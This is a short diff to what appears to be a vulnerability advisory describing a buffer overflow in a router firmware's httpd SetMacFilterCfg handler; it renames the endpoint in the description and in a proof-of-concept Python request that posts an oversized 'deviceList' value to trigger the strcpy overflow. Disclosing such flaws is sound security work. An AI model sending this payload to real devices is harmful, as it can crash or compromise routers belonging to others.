@@ -6,7 +6,7 @@ version: V15.03.06.51
 
 ## Description:
 
-There is a buffer overflow in httpd/formSetMacFilterCfg
+There is a buffer overflow in httpd/SetMacFilterCfg
 
 ## Source:
 
@@ -36,7 +36,7 @@ finally call strcpy ,cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetMacFilterCfg"
+url = "http://192.168.1.13/goform/SetMacFilterCfg"
 payload = 'A'*0x1000h + '\n'
 
 r = requests.post(url, data={'deviceList': payload , 'macFilterType': 1 })
